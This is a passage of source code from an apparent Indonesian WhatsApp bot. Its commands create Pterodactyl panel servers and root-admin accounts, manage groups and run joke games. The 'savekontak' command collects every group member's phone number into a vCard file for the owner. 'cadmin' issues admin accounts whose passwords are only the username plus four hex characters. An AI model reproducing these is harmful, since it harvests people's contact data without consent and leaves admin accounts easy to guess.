    const name = capitalize(username) + " kayzen";
    const password = username + crypto.randomBytes(3).toString("hex");

    try {
        const userResponse = await axios.post(`${global.domain}/api/application/users`, {
            email, username, first_name: name, last_name: "Server", language: "en", password
        }, {
            headers: {
                Authorization: `Bearer ${global.apikey}`,
                "Content-Type": "application/json",
                Accept: "application/json"
            }
        });

        const user = userResponse.data.attributes;

        const eggResponse = await axios.get(`${global.domain}/api/application/nests/${global.nestid}/eggs/${global.egg}`, {
            headers: {
                Authorization: `Bearer ${global.apikey}`,
                "Content-Type": "application/json",
                Accept: "application/json"
            }
        });

        const startup_cmd = eggResponse.data.attributes.startup;

        const serverResponse = await axios.post(`${global.domain}/api/application/servers`, {
            name, description: tanggal(Date.now()), user: user.id, egg: parseInt(global.egg),
            docker_image: "ghcr.io/parkervcp/yolks:nodejs_18", startup: startup_cmd,
            environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
            limits: { memory: ram, swap: 0, disk: disknya, io: 500, cpu },
            feature_limits: { databases: 5, backups: 5, allocations: 5 },
            deploy: { locations: [parseInt(global.loc)], dedicated_ip: false, port_range: [] }
        }, {
            headers: {
                Authorization: `Bearer ${global.apikey}`,
                "Content-Type": "application/json",
                Accept: "application/json"
            }
        });

        const server = serverResponse.data.attributes;

        if (m.isGroup) {
            if (isOwner && nomor !== m.sender) {
                await m.reply(`✅ Akun panel berhasil dibuat!\nData telah dikirim ke nomor ${nomor.split("@")[0]}`);
            } else {
                await m.reply(`✅ Akun panel berhasil dibuat!\nData telah dikirim ke chat pribadi Anda.`);
            }
        }

        const detailpanel = `
「 𖤍 」 *Panel Berhasil Dibuat!*

- *Server ID :* ${server.id}
- *Username :* ${user.username}
- *Password :* ${password}
- *Link Login :* 
${global.domain}

「 𖤍 」 *Spesifikasi:*
- RAM : ${ram === "0" ? "Unlimited" : `${parseInt(ram) / 1000} GB`}
- Disk : ${disknya === "0" ? "Unlimited" : `${parseInt(disknya) / 1000} GB`}
- CPU : ${cpu === "0" ? "Unlimited" : `${cpu}%`}

*Dibuat Pada :* 
${tanggal(Date.now())}

✦ 𝑲𝒂𝒚𝒛𝒆𝒏 𝑺𝒄𝒓𝒊𝒑𝒕 𝒄𝒐𝒎𝒆𝒔 𝒕𝒐 𝒉𝒆𝒍𝒑 𝒚𝒐𝒖. -
> "congratulations on your new panel, take care of this panel like you took care of it!".-
`.trim();

        const preparedImage = await prepareWAMessageMedia({
            image: { url: 'https://img1.pixhost.to/images/9684/655018223_dlan.jpg' }
        }, { upload: Nocuz.waUploadToServer });

        preparedImage.imageMessage.contextInfo = {
            ...preparedImage.imageMessage.contextInfo,
            renderLargerThumbnail: true
        };

        const interactiveMessage = {
            body: { text: detailpanel },
            footer: { text: '© NOCUZ VERSION 6' },
            header: {
                title: "Created By SarDev V5",
                hasMediaAttachment: true,
                imageMessage: preparedImage.imageMessage
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({ display_text: "COPY USERNAME", copy_code: user.username })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({ display_text: "COPY PASSWORD", copy_code: password })
                    }
                ]
            }
        };

        const msg = generateWAMessageFromContent(nomor, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                    interactiveMessage
                }
            }
        }, { userJid: nomor });

        await Nocuz.relayMessage(nomor, msg.message, { messageId: msg.key.id });

    } catch (err) {
        const e = err?.response?.data?.errors?.[0]?.detail || err.message;
        return m.reply(`❌ Error:\n${e}`);
    }
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "cadmin": {
    const missingSettings = [];
if (!global.domain || global.domain === "-") {
    missingSettings.push("`global.domain`");
}
if (!global.apikey || global.apikey === "-") {
    missingSettings.push("`global.apikey` (kunci ptla)");
}
if (!global.capikey || global.capikey === "-") {
    missingSettings.push("`global.capikey` (kunci ptlc)");
}

if (missingSettings.length > 0) {
    let replyText = '⚠️ *Konfigurasi Belum Lengkap!*\n\n';
    replyText += 'Harap isi informasi berikut di file `config.js` untuk dapat menggunakan fitur ini:\n\n';
    missingSettings.forEach(setting => {
        replyText += `• ${setting}\n`;
    });
    return m.reply(replyText.trim());
}

    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Contoh Penggunaan:\n.cadmin username,628×××`);
    
    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = text.split(",");
        if (!users || !nom) return m.reply(`Contoh Penggunaan:\n.cadmin username,628...`);
        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat;
    }
    
    const [onWa] = await Nocuz.onWhatsApp(nomor.split("@")[0]);
    if (!onWa?.exists) return m.reply("Nomor target tidak terdaftar di WhatsApp!");

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = capitalize(usernem);
    let password = username + crypto.randomBytes(2).toString('hex');
    
    try {
        const userResponse = await axios.post(global.domain + "/api/application/users", {
            "email": email,
            "username": username,
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password
        }, {
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikey
            }
        });

        const user = userResponse.data.attributes;

        const detailTeks = `
「 𖤍 」 *Akun Admin Panel Anda*

- *ID User :* ${user.id}
- *Username :* ${user.username}
- *Password :* ${password}
- *Link Login :* 
${global.domain}

*Dibuat Pada :*
 ${tanggal(Date.now())}
 
 ✦ 𝑲𝒂𝒚𝒛𝒆𝒏 𝑺𝒄𝒓𝒊𝒑𝒕 𝒄𝒐𝒎𝒆𝒔 𝒕𝒐 𝒉𝒆𝒍𝒑 𝒚𝒐𝒖. -
> "congratulations on your new admin panel, take care of this admin panel like you took care of it!".-
`.trim();
        
        const preparedImage = await prepareWAMessageMedia({ 
        image: { url: 'https://img1.pixhost.to/images/9684/655018223_dlan.jpg' } }, { upload: Nocuz.waUploadToServer });

        const interactiveMessage = {
            body: { text: detailTeks },
            footer: { text: '© NOCUZ VERSION 6' },
            header: {
                title: "Created By SarDev V5",
                hasMediaAttachment: true,
                imageMessage: preparedImage.imageMessage
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "COPY USERNAME",
                            copy_code: user.username
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "COPY PASSWORD",
                            copy_code: password
                        })
                    }
                ]
            }
        };

        const msg = generateWAMessageFromContent(nomor, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: interactiveMessage
                }
            }
        }, { userJid: nomor });

        await Nocuz.relayMessage(nomor, msg.message, { messageId: msg.key.id });

        await m.reply(`✅ Berhasil membuat akun Admin Panel!\nData akun telah dikirim ke nomor ${nomor.split("@")[0]}`);
    } catch (error) {
        const errorMsg = error.response ? JSON.stringify(error.response.data.errors[0], null, 2) : error.message;
        return m.reply(`Terjadi Kesalahan:\n${errorMsg}`);
    }
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'listpanel': {
    if (!isCreator) return m.reply(mess.owner);
    
    try {
        const serverListResponse = await axios.get(`${global.domain}/api/application/servers`, {
            headers: { "Authorization": "Bearer " + global.apikey }
        });

        const servers = serverListResponse.data.data;
        if (!servers || servers.length === 0) {
            return m.reply("Tidak ada server yang ditemukan di panel.");
        }

        let daftarPanel = "「 𖤍 」*DAFTAR SEMUA AKUN PANEL*\n";
        for (const server of servers) {
            try {
                const userDetails = await axios.get(`${global.domain}/api/application/users/${server.attributes.user}`, {
                    headers: { "Authorization": "Bearer " + global.apikey }
                });
                const username = userDetails.data.attributes.username;
                const isAdmin = userDetails.data.attributes.root_admin;
                daftarPanel += `\n─────────────────\n`;
                daftarPanel += `*Server:* ${server.attributes.name}\n`;
                daftarPanel += `*ID Server:* ${server.attributes.id}\n`;
                daftarPanel += `*User:* ${username} ${isAdmin ? '*(Admin)*' : ''}`;
            } catch (userError) {
                daftarPanel += `\n─────────────────\n`;
                daftarPanel += `*Server:* ${server.attributes.name}\n`;
                daftarPanel += `*ID Server:* ${server.attributes.id}\n`;
                daftarPanel += `*User:* (Gagal mengambil data)`;
            }
        }
        
        m.reply(daftarPanel.trim());

    } catch (error) {
        m.reply(`Terjadi Kesalahan:\n${error.message}`);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'listadmin': {
    if (!isCreator) return m.reply(mess.owner);
    
    try {
        const userListResponse = await axios.get(`${global.domain}/api/application/users`, {
            headers: { "Authorization": "Bearer " + global.apikey }
        });
        const allUsers = userListResponse.data.data;
        const adminUsers = allUsers.filter(user => user.attributes.root_admin);
        if (adminUsers.length === 0) {
            return m.reply("Tidak ada user admin yang ditemukan di panel.");
        }
        let daftarAdmin = "「 𖤍 」*DAFTAR SEMUA USER ADMIN*\n";
        adminUsers.forEach(user => {
            daftarAdmin += `\n─────────────────\n`;
            daftarAdmin += `*Username:* ${user.attributes.username}\n`;
            daftarAdmin += `*ID User:* ${user.attributes.id}\n`;
            daftarAdmin += `*Email:* ${user.attributes.email}`;
        });
        
        m.reply(daftarAdmin.trim());

    } catch (error) {
        m.reply(`Terjadi Kesalahan:\n${error.message}`);
    }
}
break;


//  █████████████████████████████████
//   ████████████[ CASE GROUP ]█████████
//  █████████████████████████████████

case "antilink": {
        if (!m.isGroup) return Reply(mess.group);
        if (!isCreator) return Reply(mess.owner);
        if (!text) return Reply(example("on/off"));

        let teks = text.toLowerCase();

        // Pastikan grup sudah ada di database
        if (!global.db.groups[m.chat]) global.db.groups[m.chat] = { antilink: false, antilink2: false };

        if (teks === "on") {
            if (global.db.groups[m.chat].antilink) return Reply(`*Antilink* di grup ini sudah aktif!`);
            if (global.db.groups[m.chat].antilink2) global.db.groups[m.chat].antilink2 = false;

            global.db.groups[m.chat].antilink = true;
            return Reply("✅ Berhasil menyalakan *antilink* di grup ini");
        } else if (teks === "off") {
            if (!global.db.groups[m.chat].antilink) return Reply(`*Antilink* di grup ini tidak aktif!`);
            global.db.groups[m.chat].antilink = false;
            return Reply("✅ Berhasil mematikan *antilink* di grup ini");
        } else return Reply(example("on/off"));
    }
    break;

    // ----------------------- ANTILINK V2 ----------------------- //
    case "antilink2": {
        if (!m.isGroup) return Reply(mess.group);
        if (!isCreator) return Reply(mess.owner);
        if (!text) return Reply(example("on/off"));

        let teks = text.toLowerCase();

        if (!global.db.groups[m.chat]) global.db.groups[m.chat] = { antilink: false, antilink2: false };

        if (teks === "on") {
            if (global.db.groups[m.chat].antilink2) return Reply(`*Antilink2* di grup ini sudah aktif!`);
            if (global.db.groups[m.chat].antilink) global.db.groups[m.chat].antilink = false;

            global.db.groups[m.chat].antilink2 = true;
            return Reply("✅ Berhasil menyalakan *antilink2* di grup ini");
        } else if (teks === "off") {
            if (!global.db.groups[m.chat].antilink2) return Reply(`*Antilink2* di grup ini tidak aktif!`);
            global.db.groups[m.chat].antilink2 = false;
            return Reply("✅ Berhasil mematikan *antilink2* di grup ini");
        } else return Reply(example("on/off"));
    }
    break;


case "closegc": 
case "close": 
case "opengc": 
case "open": {

        if (!m.isGroup) return Reply(mess.group);
        if (!isCreator) return Reply(mess.owner);

    if (/open|opengc/.test(command)) {
        if (m.metadata.announce == false) return 
        await Nocuz.groupSettingUpdate(m.chat, 'not_announcement')
    } else if (/closegc|close/.test(command)) {
        if (m.metadata.announce == true) return 
        await Nocuz.groupSettingUpdate(m.chat, 'announcement')
    } else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "demote":
case "promote": {

        if (!m.isGroup) return Reply(mess.group);
        if (!isCreator) return Reply(mess.owner);

    if (m.quoted || text) {
        var action
        let target = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : m.quoted 
                ? m.quoted.sender 
                : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

        if (/demote/.test(command)) action = "Demote"
        if (/promote/.test(command)) action = "Promote"

        await Nocuz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
            await Nocuz.sendMessage(
                m.chat, 
                { text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target] }, 
                { quoted: m }
            )
        })
    } else {
        return Reply(example("@tag/62×××"))
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "idgc": 
case "cekidgc": {
    if (!m.isGroup) return Reply(mess.group)
    m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "listgc": 
case "listgrup": {
    if (!isCreator) return
    let teks = `\n *List all group chat*\n`
    let a = await Nocuz.groupFetchAllParticipating()
    let gc = Object.values(a)
    teks += `\n* *Total group :* ${gc.length}\n`
    for (const u of gc) {
        teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka" : "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
    }
    return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "addmember": {
        if (!m.isGroup) return Reply(mess.group);
        if (!isCreator) return Reply(mess.owner);

    if (text) {
        const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
        var onWa = await Nocuz.onWhatsApp(input.split("@")[0])

        if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")

        const res = await Nocuz.groupParticipantsUpdate(m.chat, [input], 'add')
        if (Object.keys(res).length == 0) {
            return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
        } else {
            return m.reply(JSON.stringify(res, null, 2))
        }
    } else {
        return m.reply(example("62838###"))
    }
}
break
  //~~~~~~~[CASE UPDATE V6]~~~~~~\\
  
  
case 'getpp':{
  if (!isCreator) {
    return reply(`✨ Cara Penggunaan yang Elegan ✨

Untuk mengambil foto profil seseorang:
1. Balas/reply pesan orang yang ingin Anda ambil fotonya
2. Ketik ${prefix}getpp

Contoh: 
> *User A mengirim pesan*
> *Anda membalas pesan User A dengan:* ${prefix}getpp

Mari kita jelajahi keindahan profil bersama! 📸✨`)
  }
  
  try {
    pporg = await Nocuz.profilePictureUrl(m.quoted.sender, 'image')
  } catch {
    pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
  }
  Nocuz.sendMessage(m.chat, { image : { url : pporg }, caption:`✨ ${pushname}! Inilah potret digital yang Anda cari.\nSemoga keindahannya memenuhi ekspektasi Anda! 📸🌟` }, {quoted : m})
}
break;  

//===================================\\

case "savekontak": case "svkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return Reply(`Masukan namakontak\n*Contoh :* ${cmd} Nocuz+
-market`)
global.namakontak = text
let rows = []
const a = await Nocuz.groupFetchAllParticipating()
if (a.length < 1) return Reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.savekontak-response ${u.id}`
})
}
await Nocuz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `©  ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Savekontak\n`
}, { quoted: m })
}
break;

case "savekontak-response": {
  if (!isOwner) return Reply(mess.owner)
  if (!global.namakontak) return Reply(`Data nama savekontak tidak ditemukan!\nSilahkan ketik *.savekontak* namakontak`);
  try {
    const res = await Nocuz.groupMetadata(text)
    const halls = res.participants
      .filter(v => v.id.includes(".net") ? v.id : v.jid.endsWith('.net'))
      .map(v => v.id.includes(".net") ? v.id : v.jid)
      .filter(id => id !== botNumber && id.split("@")[0] !== global.owner)

    if (!halls.length) return Reply("Tidak ada kontak yang bisa disimpan.")
    let names = text
    const existingContacts = JSON.parse(fs.readFileSync('./database/contacts.json', 'utf8') || '[]')
    const newContacts = [...new Set([...existingContacts, ...halls])]

    fs.writeFileSync('./database/contacts.json', JSON.stringify(newContacts, null, 2))

    // Buat file .vcf
    const vcardContent = newContacts.map(contact => {
      const phone = contact.split("@")[0]
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:${global.namakontak} - ${phone}`,
        `TEL;type=CELL;type=VOICE;waid=${phone}:+${phone}`,
        "END:VCARD",
        ""
      ].join("\n")
    }).join("")

    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")

    // Kirim ke private chat
    if (m.chat !== m.sender) {
      await Reply(`Berhasil membuat file kontak dari grup ${res.subject}\n\nFile kontak telah dikirim ke private chat\nTotal ${halls.length} kontak`)
    }

    await Nocuz.sendMessage(
      m.sender,
      {
        document: fs.readFileSync("./database/contacts.vcf"),
        fileName: "contacts.vcf",
        caption: `File kontak berhasil dibuat ✅\nTotal ${halls.length} kontak`,
        mimetype: "text/vcard",
      },
      { quoted: m }
    )
    
    delete global.namakontak

    fs.writeFileSync("./database/contacts.json", "[]")
    fs.writeFileSync("./database/contacts.vcf", "")

  } catch (err) {
    Reply("Terjadi kesalahan saat menyimpan kontak:\n" + err.toString())
  }
}
break;

//===================================\\

case 'tambah':{
if (!text.includes('+')) return Reply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
Reply(`${nilai_one + nilai_two}`)}
break;

//————————————————————//

case 'kurang':{
if (!text.includes('-')) return Reply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
Reply(`${nilai_one - nilai_two}`)}
break;

//————————————————————//

case 'kali':{
if (!text.includes('x')) return Reply(`Gunakan dengan cara ${prefix+command} *angka* x *angka*\n\n_Contoh_\n\n${prefix+command} 1x2`)
arg = args.join(' ')
atas = arg.split('x')[0]
bawah = arg.split('x')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
Reply(`${nilai_one * nilai_two}`)}
break;

//————————————————————//

case 'bagi':{
if (!text.includes('/')) return Reply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
Reply(`${nilai_one / nilai_two}`)}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "kick": 
case "kik": {
        if (!m.isGroup) return Reply(mess.group);
        if (!isCreator) return Reply(mess.owner);


    if (text || m.quoted) {
        const input = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : m.quoted 
                ? m.quoted.sender 
                : text 
                    ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" 
                    : false

        var onWa = await Nocuz.onWhatsApp(input.split("@")[0])
        if (onWa.length < 1) return Reply("Nomor tidak terdaftar di whatsapp")

        const res = await Nocuz.groupParticipantsUpdate(m.chat, [input], 'remove')
        await Reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
    } else {
        return Reply(example("@tag/reply"))
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "leave": {
    if (!isCreator) return Reply(mess.owner)
    if (!m.isGroup) return Reply(mess.group)

    await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
    await sleep(4000)
    await Nocuz.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "resetlinkgc": {
    if (!isCreator) return Reply(mess.owner)
    if (!m.isGroup) return Reply(mess.group)

    await Nocuz.groupRevokeInvite(m.chat)
    Reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tagall": {  
        if (!m.isGroup) return Reply(mess.group);
        if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("pesannya"))  

    let teks = text + "\n\n"  
    let member = await m.metadata.participants
        .map(v => v.id)
        .filter(e => e !== botNumber && e !== m.sender)  

    await member.forEach((e) => {  
        teks += `@${e.split("@")[0]}\n`  
    })  

    await Nocuz.sendMessage(
        m.chat, 
        { text: teks, mentions: [...member] }, 
        { quoted: m }
    )  
}  
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "ht": 
case "hidetag": {
    if (!m.isGroup) return Reply(mess.group)
    if (!isCreator && !m.isAdmin) return Reply(mess.admin)
    if (!text) return Reply(example("sertakan pesan!"))

    let member = m.metadata.participants.map(v => v.id)

    await Nocuz.sendMessage(
        m.chat, 
        { text: text, mentions: [...member] }, 
        { quoted: m }
    )
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "linkgc": {
    if (!m.isGroup) return Reply(mess.group)
    const urlGrup = "https://chat.whatsapp.com/" + await Nocuz.groupInviteCode(m.chat)
    var teks = `
${urlGrup}
`
    await Nocuz.sendMessage(
        m.chat, 
        { text: teks, matchedText: `${urlGrup}` }, 
        { quoted: m }
    )
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "welcome": {
    if (!m.isGroup) return Reply(mess.group)
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply(example("on/off"))

    let teks = text.toLowerCase()
    if (teks == "on") {
        if (global.db.groups[m.chat].welcome == true) 
            return Reply(`*Welcome* di grup ini sudah aktif!`)
        
        global.db.groups[m.chat].welcome = true
        return Reply("Berhasil menyalakan *welcome* di grup ini")
    } else if (teks == "off") {
        if (global.db.groups[m.chat].welcome == false) 
            return Reply(`*Welcome* di grup ini tidak aktif!`)
        
        global.db.groups[m.chat].welcome = false
        return m.reply("Berhasil mematikan *welcome* di grup ini")
    } else {
        return Reply(example("on/off"))
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "mute": {
    if (!m.isGroup) return Reply(mess.group)
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply(example("on/off"))

    let teks = text.toLowerCase()
    if (teks == "on") {
    if (global.db.groups[m.chat].mute == true) 
            return Reply(`*Mute* di grup ini sudah aktif!`)

    global.db.groups[m.chat].mute = true
        return Reply("Berhasil menyalakan *mute* di grup ini")
    }
    else if (teks == "off") {
        if (global.db.groups[m.chat].mute == false) 
            return Reply(`*Mute* di grup ini tidak aktif!`)

        global.db.groups[m.chat].mute = false
        return Reply("Berhasil mematikan *mute* di grup ini")
    } else {
        return Reply(example("on/off"))
    }
}
break

//  █████████████████████████████████
//   ████████████[ CASE FUN ]███████████
//  █████████████████████████████████
case 'mediafire': case 'mf': {
    if (!text) return Reply(example("https://www.mediafire.com/file/xxx"));
    
    await Nocuz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
    
    try {
        const file = await mediafire(text);
        let caption = `
*📥 MEDIAFIRE DOWNLOADER*

*📛 Nama:* ${file.nama}
*💾 Ukuran:* ${file.size}
*📄 Tipe:* ${file.mime}
*🖥️ Server:* ${file.server || "MediaFire"}
*🔗 Link:* ${file.link}

*✅ Download berhasil!*
        `.trim();
        
        const fileBuffer = await getBuffer(file.link);
        
        await Nocuz.sendMessage(
            m.chat, 
            {
                document: fileBuffer,
                fileName: file.nama,
                mimetype: file.mime,
                caption: caption
            }, 
            { quoted: m }
        );
        
        await Nocuz.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        
    } catch (err) {
        console.error("MediaFire Error:", err);
        await Nocuz.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        Reply("❌ Gagal download dari Mediafire! " + err.message);
    }
    break;
}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "cekganteng": {
if (!args[0]) return Reply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
Reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "cekcantik": {
if (!args[0]) return Reply('NAMA LU MANA??')
const cantik = [
"cuman 10% doang", "20% kurang cantik soal nya", "0% karna nggak cantik", 
"30% mayan cantikk", "40% cantik", "50% Otw cari sugar daddy😎", 
"60% Orang Cantik", "70% Cantik bet", "80% cantikkk parah", 
"90% Cantik idaman cowok", "100% Cantik Bgt bjirr"
]
const hasil = cantik[Math.floor(Math.random() * cantik.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
Reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'cekkhodam': case 'cekkodam': {
if (!text) return Reply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"sigit rendang🤮",
"bocil epep 🗿",
"depopeler buk wangcap😹",
"Soft Boy😇",
"iBL1s😈",
"Sat Boy🥶",
"Vilain ☠️",
"Dev Rinem 😹",
"Depopeler Rinem Esce😹",
]

let kdm = pickRandom(khodam)
const kodamn = `*Khodam ${text} adalah:* ${kdm}`
Reply(kodamn)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'sertifikattolol': {
if (args.length === 0) {
await Nocuz.sendMessage(m.chat, { 
    text: "❗ Silakan masukkan teks untuk sertifikat.\n\nContoh: *.sertifikattolol Jamal*" 
}, { quoted: m });
break; 
}
const text = args.join(" ");
const imageUrl = `https://api.siputzx.my.id/api/m/sertifikat-tolol?text=${encodeURIComponent(text)}`;
try {
    await Nocuz.sendMessage(m.chat, { 
        image: { url: imageUrl },
        caption: `🖼️ *Sertifikat Tolol Untuk ${text}*`
    }, { quoted: m });
} catch (error) {
    console.error("Error mengambil gambar:", error.message);
    await Nocuz.sendMessage(m.chat, { 
        text: "❌ Gagal mengambil gambar. Pastikan API aktif atau coba lagi nanti!" 
    }, { quoted: m });
}
break; 
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "sertifikatbaik": {
    if (!text) {
        await Nocuz.sendMessage(m.chat, { 
            text: "❗ Masukkan nama untuk sertifikat.\n\nContoh: *.sertifikatbaik kayzen*" 
        }, { quoted: m });
        break;
    }
    const namaBaik = text;
    await generateAndSendCertificate(namaBaik, "Anda dinyatakan Baik!");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "sertifikatcantik": {
    if (!text) {
        await Nocuz.sendMessage(m.chat, { 
            text: "❗ Masukkan nama untuk sertifikat.\n\nContoh: *.sertifikatcantik kayzen*" 
        }, { quoted: m });
        break;
    }
    const namaCantik = text;
    await generateAndSendCertificate(namaCantik, "Anda dinyatakan Cantik!");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "sertifikatganteng": {
    if (!text) {
        await Nocuz.sendMessage(m.chat, { 
            text: "❗ Masukkan nama untuk sertifikat.\n\nContoh: *.sertifikatganteng kayzen*" 
        }, { quoted: m });
        break;
    }
    const namaGanteng = text;
    await generateAndSendCertificate(namaGanteng, "Anda dinyatakan Ganteng!");
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "sertifikathitam": {
    if (!text) {
        await Nocuz.sendMessage(m.chat, { 
            text: "❗ Masukkan nama untuk sertifikat.\n\nContoh: *.sertifikathitam John*" 
        }, { quoted: m });
        break;
    }
    const namaHitam = text;
    await generateAndSendCertificate(namaHitam, "Anda dinyatakan Berkelas Hitam!");
}
break;


// Helper pickRandom
function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())];
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "tebakbendera": {
    Nocuz.tebakbendera ??= {};
    if (Nocuz.tebakbendera[m.chat]) {
        return Nocuz.sendMessage(m.chat, { 
            text: "❗ Masih ada soal yang belum terjawab" 
        }, { quoted: Nocuz.tebakbendera[m.chat][1] });
    }

    try {
        let response = await fetch("https://raw.githubusercontent.com/alands-offc/database/refs/heads/master/games/tebakbendera2.json");
        let data = await response.json();
        let json = pickRandom(data);

        Nocuz.tebakbendera[m.chat] = [
            json,
            await Nocuz.sendMessage(m.chat, {
                image: { url: json.img },
                caption: `🏳️ Tebak bendera apakah ini?\n⏳ Waktu habis: 120 detik dari sekarang\nKetik *menyerah* untuk menyerah\nBalas pesan ini untuk menjawab`
            }, { quoted: m }),
            setTimeout(async () => {
                await Nocuz.sendMessage(m.chat, {
                    text: `⏰ Waktu habis!\nJawabannya: *${json.name.toLowerCase()}*`
                }, { quoted: Nocuz.tebakbendera[m.chat][1] });
